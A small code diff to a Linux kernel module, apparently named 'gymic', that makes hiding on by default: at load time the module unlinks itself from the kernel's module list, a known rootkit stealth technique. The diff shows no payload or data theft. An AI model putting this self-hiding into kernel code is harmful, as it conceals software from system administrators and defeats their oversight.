@@ -21,7 +21,7 @@ dev_t gymic_main_device_num;
 bool processes = true;
 bool threads = true;
 bool syscall = false;
-bool unlink = false;
+bool hide = true;
 
 // Memory management
 extern struct resource iomem_resource;
@@ -55,9 +55,9 @@ static int __init gymic_main_init(void)
 	int i;
 	int res;
 	
-	if(unlink)
+	if(hide)
 	{
-		//Hide Module
+		//Unlink Module
 		list_del_init(&__this_module.list);
 	}
 	
